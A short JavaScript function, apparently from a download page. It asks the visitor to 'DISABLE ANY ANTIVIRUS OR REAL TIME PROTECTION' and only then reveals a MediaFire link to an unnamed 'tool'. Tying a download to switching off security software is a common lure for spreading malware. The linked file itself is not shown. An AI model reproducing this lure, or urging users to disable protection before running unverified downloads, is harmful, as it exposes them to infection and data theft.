  function showDownloadLink() {
            var confirmDownload = confirm("DISABLE ANY ANTIVIRUS OR REAL TIME PROTECTION");
            
            if (confirmDownload) {
                document.getElementById('downloadLink').style.display = 'block';
                document.getElementById('downloadLink').innerHTML = 'Download tool now <a href="https://www.mediafire.com/folder/hfjcov4f3q8ww/Release">here</a>.';
            }
        }
